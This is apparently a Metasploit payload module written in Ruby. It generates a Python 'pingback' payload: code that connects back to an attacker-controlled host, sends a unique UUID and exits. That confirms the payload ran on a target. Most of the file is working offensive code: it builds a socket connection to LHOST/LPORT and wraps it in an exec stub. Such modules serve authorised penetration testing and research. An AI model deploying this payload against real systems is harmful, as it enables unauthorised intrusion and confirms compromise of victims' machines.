module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Pingback, Reverse TCP (via python)',
        'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
        'Author' => 'asoto-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Pingback,
        'PayloadType' => 'python'
      )
    )
  end

  def generate(_opts = {})
    super.to_s + command_string
  end

  def command_string
    self.pingback_uuid ||= generate_pingback_uuid
    cmd = <<~PYTHON
      import binascii as b
      import socket as s
      o=s.socket(s.AF_INET,s.SOCK_STREAM)
      try:
       o.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
       o.send(b.a2b_base64('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'))
       o.close()
      except:
       pass
    PYTHON

    py_create_exec_stub(cmd)
  end
end
